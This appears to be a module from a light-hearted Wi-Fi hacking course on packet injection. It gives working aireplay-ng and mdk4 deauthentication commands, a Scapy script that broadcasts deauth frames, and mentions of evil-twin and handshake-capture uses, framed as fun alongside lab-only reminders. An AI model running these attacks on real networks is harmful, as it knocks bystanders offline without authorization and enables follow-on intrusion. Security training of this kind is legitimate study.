🎯 Module 9: Packet Injection & Fun with Frames

Welcome to the action zone! In this module, we’re not just listening — we’re talking back to the network. This is where we learn packet injection, the art of injecting custom frames into Wi-Fi traffic. 🛰️💣

📦 What is Packet Injection?

Imagine you’re in a group chat and you suddenly drop a meme that looks like it came from the admin. That’s packet injection — inserting your own data into the network to trick devices or gather info.

📊 Real World Example

Bob’s laptop thinks it's still talking to the router. You inject a deauth packet that says, "GTFO." Bob disconnects. You laugh. 😎

🔧 Tools of the Trade

  • aireplay-ng – For deauth attacks, fake auths, replay attacks
  • mdk4 – A Swiss Army knife for Wi-Fi injection chaos
  • Scapy – Python tool to craft custom frames (for nerds)

📶 Injection Test

Before launching attacks, test if your adapter supports injection:

aireplay-ng --test wlan0mon

💥 Deauthentication Attack

This is the Wi-Fi version of kicking someone out of a room:

aireplay-ng --deauth 10 -a <router MAC> -c <client MAC> wlan0mon

🧪 Fun Attack with mdk4

Make all Wi-Fi devices in the area cry (use responsibly):

mdk4 wlan0mon d
💡 Note: Always run these attacks in a lab or test environment. Don’t make your neighbor’s Netflix stop buffering.

🧠 Real Case Use

You can use packet injection to:

  • Disconnect clients to capture handshakes
  • Fake a network (evil twin)
  • Trigger reconnections to analyze traffic

🐍 Going Pro with Scapy

If you want to flex your Python skills:

from scapy.all import *

packet = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2="00:11:22:33:44:55", addr3="00:11:22:33:44:55")/Dot11Deauth()
sendp(packet, iface="wlan0mon", count=100)

🚨 Legal Reminder

Always remember: Test. Learn. Never harm. Use your powers ethically and only in authorized environments. 🧑‍🏫

📦 Summary

  • Packet injection lets you interact with Wi-Fi traffic
  • Common attacks: deauth, fake auth, beacon spam
  • Tools: aireplay-ng, mdk4, Scapy
